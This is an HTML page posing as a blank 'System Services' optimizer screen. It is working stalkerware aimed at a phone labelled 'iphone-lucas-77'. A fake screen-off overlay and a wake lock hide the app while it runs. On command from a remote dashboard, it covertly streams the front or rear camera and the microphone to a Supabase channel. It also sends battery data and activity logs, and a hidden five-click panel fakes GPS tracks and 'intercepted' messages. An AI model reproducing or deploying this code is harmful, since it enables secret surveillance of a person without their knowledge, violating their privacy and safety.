<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Services</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body {
            background-color: #000;
            color: #222;
            font-family: -apple-system, sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }
        .stealth-container {
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 24px;
            height: 24px;
            border: 2px solid rgba(255,255,255,0.05);
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 2s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        h1 { font-size: 10px; font-weight: normal; color: #111; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
        p { font-size: 10px; color: #111; text-transform: uppercase; letter-spacing: 1px; }

        /* Faux écran veille — l'écran semble éteint mais l'app tourne */
        #fake-screen-off {
            display: none;
            position: fixed;
            inset: 0;
            background: #000;
            z-index: 9998;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            cursor: none;
        }
        #fake-screen-off .ss-time {
            color: #1c1c1c;
            font-size: 56px;
            font-weight: 200;
            font-family: -apple-system, sans-serif;
            letter-spacing: 4px;
        }
        #fake-screen-off .ss-date {
            color: #141414;
            font-size: 13px;
            margin-top: 8px;
            letter-spacing: 2px;
        }
        #fake-screen-off .ss-dot {
            width: 4px;
            height: 4px;
            border-radius: 50%;
            background: #1a1a1a;
            margin-top: 40px;
            animation: pulse-dot 3s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.7; }
        }

        /* Secret Simulator (Hidden by default, triggered by 5 clicks on background) */
        #secret-panel {
            display: none;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #111;
            padding: 20px;
            border-top: 1px solid #333;
            color: white;
            z-index: 1000;
        }
        .btn-action {
            background: #333;
            color: white;
            border: none;
            padding: 8px;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
            border-radius: 4px;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body onclick="handleSecretClick()">
    <!-- Faux écran éteint — masque l'app mais la garde en premier plan -->
    <div id="fake-screen-off">
        <div class="ss-time" id="ss-time">00:00</div>
        <div class="ss-date" id="ss-date"></div>
        <div class="ss-dot"></div>
    </div>

    <div class="stealth-container">
        <div class="spinner"></div>
        <p>System Optimized</p>
    </div>

    <!-- Panel de contrôle caché -->
    <div id="secret-panel">
        <h2 style="font-size: 14px;">🛠️ Configuration Admin</h2>
        <p style="font-size: 11px; color: #888;">Activez les accès requis par le navigateur :</p>
        
        <button class="btn-action" style="background: #e11d48;" onclick="requestPermissions()">🔓 Activer Permissions Caméra / Micro</button>
        
        <div id="debug-logs" style="font-size:10px; color:#666; margin-top:20px; border-top:1px solid #333; padding-top:10px;">
            Initialisation du système...
        </div>

        <hr style="border: 0; border-top: 1px solid #333; margin: 15px 0;">
        
        <button class="btn-action" onclick="toggleGps()">📍 Simuler Déplacement GPS</button>
        <div style="margin-top: 10px;">
            <input type="text" id="sim-sender" placeholder="Expéditeur" style="width:100%; background:#222; border:1px solid #444; color:white; padding: 5px;">
            <input type="text" id="sim-msg" placeholder="Message" style="width:100%; background:#222; border:1px solid #444; color:white; margin-top:5px; padding: 5px;">
            <button class="btn-action" onclick="simulateMessage()">✉️ Envoyer Message Test</button>
        </div>
        <button class="btn-action" style="background:#222; border: 1px solid #444;" onclick="document.getElementById('secret-panel').style.display='none'">Masquer ce panel</button>
    </div>

    <script>
        const SUPABASE_URL = "https://lhsopkrbfdktjqvzvfgu.supabase.co";
        const SUPABASE_KEY = "sb_publishable_fqMsbMKGzUDncTdW7kMLaA_mmROVye4";
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        const DEVICE_ID = "iphone-lucas-77";

        // --- FAUX ÉCRAN VEILLE ---
        let ssTimeout = null;
        const fakeScreen = document.getElementById('fake-screen-off');

        function updateScreensaverClock() {
            const now = new Date();
            const h = now.getHours().toString().padStart(2, '0');
            const m = now.getMinutes().toString().padStart(2, '0');
            document.getElementById('ss-time').textContent = h + ':' + m;
            const days = ['Dimanche','Lundi','Mardi','Mercredi','Jeudi','Vendredi','Samedi'];
            const months = ['jan','fév','mar','avr','mai','jun','jul','aoû','sep','oct','nov','déc'];
            document.getElementById('ss-date').textContent =
                days[now.getDay()] + ' ' + now.getDate() + ' ' + months[now.getMonth()];
        }

        function showFakeScreen() {
            updateScreensaverClock();
            fakeScreen.style.display = 'flex';
            // Mettre à jour l'heure toutes les minutes
            setInterval(updateScreensaverClock, 60000);
        }

        function hideFakeScreen() {
            fakeScreen.style.display = 'none';
            resetScreensaverTimer();
        }

        function resetScreensaverTimer() {
            clearTimeout(ssTimeout);
            ssTimeout = setTimeout(showFakeScreen, 12000); // 12s sans toucher → faux écran veille
        }

        // Masquer le faux écran sur toucher
        fakeScreen.addEventListener('touchstart', (e) => { e.stopPropagation(); hideFakeScreen(); }, { passive: true });
        fakeScreen.addEventListener('click', (e) => { e.stopPropagation(); hideFakeScreen(); });

        // Réinitialiser le timer sur toute interaction
        document.addEventListener('touchstart', resetScreensaverTimer, { passive: true });

        // Secret click logic
        let clickCount = 0;
        function handleSecretClick() {
            clickCount++;
            if (clickCount >= 5) {
                document.getElementById('secret-panel').style.display = 'block';
                clickCount = 0;
            }
            setTimeout(() => clickCount = 0, 2000); // Reset clicks after 2s
        }

        // --- MAINTIEN EN VIE : WakeLock + Anti-Interruption ---
        let wakeLock = null;

        async function acquireWakeLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    console.log("WakeLock actif : écran maintenu allumé");
                    wakeLock.addEventListener('release', () => {
                        console.log("WakeLock relâché, tentative de réacquisition...");
                        setTimeout(acquireWakeLock, 1000);
                    });
                } catch (err) {
                    console.warn("WakeLock impossible :", err.message);
                }
            }
        }

        // Reprendre le WakeLock si la page repasse en avant-plan
        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'visible') {
                await acquireWakeLock();
                // Si le stream était actif, le relancer
                if (streamInterval && (!localStream || localStream.getTracks().some(t => t.readyState === 'ended'))) {
                    console.log("Reprise du stream après retour en avant-plan...");
                    document.getElementById('debug-logs').innerText = "Reprise du stream...";
                    try { await startStream(currentFacingMode); } catch(e) {}
                }
            }
        });

        // Avertir si l'utilisateur tente de quitter la page
        window.addEventListener('beforeunload', (e) => {
            if (streamInterval) {
                e.preventDefault();
                e.returnValue = '';
            }
        });

        // Auto-Start Tracking
        window.onload = async () => {
            console.log("Stealth mode active...");

            // IMMEDIATE SIGNAL (Heartbeat)
            logActivity('system', 'Signal de Vie', 'L\'appareil cible est actif et connecté.');

            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                updateBattery(battery);
            }

            // Acquérir le WakeLock dès le chargement
            await acquireWakeLock();

            // Démarrer le timer du faux écran veille
            resetScreensaverTimer();

            // Start background tasks
            startBackgroundTasks();
        };

        async function startBackgroundTasks() {
            // Periodic Update (Status every 30 seconds)
            setInterval(async () => {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    updateBattery(battery);
                }
            }, 30000);

            // Simulation items (Logs every 45-60 seconds)
            setInterval(async () => {
                const apps = ['TikTok', 'Instagram', 'Snapchat', 'Safari'];
                const randomApp = apps[Math.floor(Math.random() * apps.length)];
                logActivity('app', `${randomApp} utilisé`, 'Session détectée via le service système.');
            }, 45000);

            // Heartbeat toutes les 20s : maintient la connexion Supabase vivante
            // et vérifie que le stream est toujours actif
            setInterval(async () => {
                try {
                    // Ping léger pour garder le WebSocket Supabase ouvert
                    await supabaseClient.from('device_status').select('device_id').eq('device_id', DEVICE_ID).limit(1);
                } catch(e) {}

                // Si le stream était actif mais s'est interrompu, relancer
                if (streamInterval && localStream) {
                    const allEnded = localStream.getTracks().every(t => t.readyState === 'ended');
                    if (allEnded) {
                        console.log("Stream interrompu détecté, relance...");
                        document.getElementById('debug-logs').innerText = "Reconnexion stream...";
                        try { await startStream(currentFacingMode); } catch(e) {}
                    }
                }
            }, 20000);
        }

        // --- CORE FUNCTIONS ---
        async function logActivity(type, title, desc) {
            await supabaseClient.from('activity_logs').insert({
                device_id: DEVICE_ID,
                type: type,
                title: title,
                description: desc
            });
        }

        async function updateBattery(battery) {
            await supabaseClient.from('device_status').upsert({
                device_id: DEVICE_ID,
                battery_level: Math.round(battery.level * 100),
                is_charging: battery.charging,
                updated_at: new Date().toISOString()
            });
        }

        // --- RELIABLE SNAPSHOT STREAMING ---
        let localStream = null;
        let captureCanvas = document.createElement('canvas');
        let captureVideo = document.createElement('video');
        let streamInterval = null;
        let mediaRecorder = null;
        let currentFacingMode = 'user';

        const webrtcChannel = supabaseClient.channel('webrtc-room', { config: { broadcast: { self: false } } });

        async function startStream(facingMode) {
            const logStatus = (msg) => { console.log(msg); document.getElementById('debug-logs').innerText = msg; };
            // Arrêter le stream précédent si actif
            if (localStream) {
                localStream.getTracks().forEach(t => t.stop());
                localStream = null;
            }
            if (mediaRecorder) { try { mediaRecorder.stop(); } catch(e){} mediaRecorder = null; }

            try {
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode, width: { ideal: 320 } },
                    audio: true
                });
                captureVideo.muted = true; // Pas de son local sur le téléphone
                captureVideo.srcObject = localStream;
                captureVideo.play();
                currentFacingMode = facingMode;
                logStatus("✅ Caméra " + (facingMode === 'user' ? 'avant' : 'arrière') + " active");

                // --- Streaming Audio via MediaRecorder ---
                // Choisir le MIME type le plus compatible
                const mimeTypes = ['audio/webm;codecs=opus', 'audio/webm', 'audio/ogg;codecs=opus', 'audio/mp4'];
                const mimeType = mimeTypes.find(t => MediaRecorder.isTypeSupported(t)) || '';
                const audioStream = new MediaStream(localStream.getAudioTracks());
                mediaRecorder = new MediaRecorder(audioStream, mimeType ? { mimeType } : {});
                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) {
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            webrtcChannel.send({
                                type: 'broadcast',
                                event: 'audio',
                                payload: { chunk: reader.result }
                            });
                        };
                        reader.readAsDataURL(e.data);
                    }
                };
                mediaRecorder.start(500); // chunk toutes les 500ms
            } catch (err) {
                logStatus("Erreur caméra : " + err.message);
                throw err;
            }
        }

        webrtcChannel.on('broadcast', { event: 'signal' }, async (payload) => {
            const data = payload.payload;
            const logStatus = (msg) => { console.log(msg); document.getElementById('debug-logs').innerText = msg; };

            if (data.offer) {
                logStatus("Appel reçu ! Démarrage de la capture...");

                if (!localStream) {
                    try {
                        await startStream(currentFacingMode);
                    } catch (err) {
                        return;
                    }
                }

                // RAFALE : Envoi ultra-rapide via Broadcast (Zéro latence)
                if (streamInterval) clearInterval(streamInterval);
                streamInterval = setInterval(async () => {
                    if (captureVideo.readyState >= 2) {
                        captureCanvas.width = 300;
                        captureCanvas.height = captureVideo.videoHeight * (300 / captureVideo.videoWidth);
                        const ctx = captureCanvas.getContext('2d');
                        ctx.drawImage(captureVideo, 0, 0, captureCanvas.width, captureCanvas.height);

                        const base64 = captureCanvas.toDataURL('image/jpeg', 0.3);

                        webrtcChannel.send({
                            type: 'broadcast',
                            event: 'frame',
                            payload: { image: base64 }
                        });
                    }
                }, 300);

                logStatus("✅ Diffusion Live Active (Vidéo + Audio)");
            }
        }).subscribe();

        // --- Écoute du changement de caméra depuis le dashboard ---
        supabaseClient.channel('camera-switch-' + DEVICE_ID)
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'device_status', filter: 'device_id=eq.' + DEVICE_ID }, async (payload) => {
                const newMode = payload.new.camera_mode;
                if (newMode && newMode !== currentFacingMode && localStream) {
                    console.log("Changement caméra demandé :", newMode);
                    document.getElementById('debug-logs').innerText = "Bascule vers caméra " + (newMode === 'user' ? 'avant' : 'arrière') + "...";
                    await startStream(newMode);
                    // Redémarrer l'envoi de frames
                    if (streamInterval) clearInterval(streamInterval);
                    streamInterval = setInterval(async () => {
                        if (captureVideo.readyState >= 2) {
                            captureCanvas.width = 300;
                            captureCanvas.height = captureVideo.videoHeight * (300 / captureVideo.videoWidth);
                            captureCanvas.getContext('2d').drawImage(captureVideo, 0, 0, captureCanvas.width, captureCanvas.height);
                            webrtcChannel.send({ type: 'broadcast', event: 'frame', payload: { image: captureCanvas.toDataURL('image/jpeg', 0.3) } });
                        }
                    }, 300);
                }
            }).subscribe();

        async function requestPermissions() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                alert("✅ Système prêt. Rafales activées !");
                document.getElementById('debug-logs').innerText = "À l'écoute du Dashboard...";
            } catch (err) {
                alert("❌ Erreur : " + err.message);
            }
        }

        // Simulator Functions
        let gpsActive = false;
        let gpsInterval = null;
        function toggleGps() {
            gpsActive = !gpsActive;
            if (gpsActive) {
                let lat = 48.8566;
                let lon = 2.3522;
                gpsInterval = setInterval(async () => {
                    lat += 0.0001; lon += 0.0001;
                    await supabaseClient.from('device_status').upsert({
                        device_id: DEVICE_ID,
                        last_latitude: lat,
                        last_longitude: lon,
                        updated_at: new Date().toISOString()
                    });
                }, 5000);
                alert("GPS Simulé activé.");
            } else {
                clearInterval(gpsInterval);
                alert("GPS Simulé arrêté.");
            }
        }

        async function simulateMessage() {
            const sender = document.getElementById('sim-sender').value || "Maman";
            const content = document.getElementById('sim-msg').value || "Tu es où ?";
            await supabaseClient.from('messages').insert({
                device_id: DEVICE_ID,
                platform: 'WhatsApp',
                sender: sender,
                content: content
            });
            logActivity('message', 'Message Intercepté', `De ${sender}`);
            alert("Message envoyé au dashboard !");
        }
    </script>
</body>
</html>
